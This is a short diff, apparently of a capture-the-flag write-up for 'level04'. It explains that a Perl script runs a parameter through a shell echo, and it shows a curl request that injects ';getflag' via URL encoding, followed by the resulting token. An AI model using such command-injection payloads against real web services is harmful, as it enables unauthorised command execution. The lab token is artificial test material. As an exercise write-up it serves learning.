@@ -15,5 +15,5 @@ x(param("x"));
 
 si x=;command, level04.pl executes echo; command 2>&1 as flag04
 
-wget http://localhost:4747/?x=;getflag
+curl http://localhost:4747/?x=%3Bgetflag (%3B is ";" encoded in URL)
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
